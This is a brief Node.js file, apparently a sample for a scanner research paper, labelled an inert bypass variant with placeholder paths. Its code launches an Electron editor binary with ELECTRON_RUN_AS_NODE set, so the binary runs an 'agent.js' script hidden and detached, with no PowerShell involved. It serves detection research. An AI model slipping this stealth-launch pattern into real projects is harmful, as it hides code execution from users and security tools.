// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// and the scanner never runs this file.
// Change: no PowerShell; the editor binary is spawned directly with windowsHide.
const { spawn } = require('child_process');
function start() {
  spawn('C:\\Placeholder\\Editor.exe', ['C:\\Placeholder\\agent.js'], { env: { ...process.env, ELECTRON_RUN_AS_NODE: '1' }, windowsHide: true, detached: true, stdio: 'ignore' }).unref();
}
module.exports = { start };
